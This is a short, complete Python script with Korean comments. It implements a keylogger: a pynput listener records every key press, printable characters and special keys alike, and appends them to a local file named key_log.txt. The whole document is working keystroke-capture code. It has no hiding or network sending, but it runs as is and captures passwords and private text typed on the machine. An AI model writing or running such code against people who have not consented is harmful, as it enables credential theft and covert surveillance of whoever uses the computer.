from pynput import keyboard
import time
import os

LOG_FILE = "key_log.txt"

class KeyLogger:
    def __init__(self):
        self.log_file = LOG_FILE

    def write_log(self, char):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(char)

    def on_press(self, key):
        try:
            # 일반 문자 키
            char = key.char
            if char is not None and 32 <= ord(char) <= 126:
                self.write_log(char)
        except AttributeError:
            # 특수 키
            try:
                self.write_log(f"[{key.name.upper()}]")
            except AttributeError:
                self.write_log(f"[{str(key)}]")

    def run(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    kl = KeyLogger()
    kl.run()
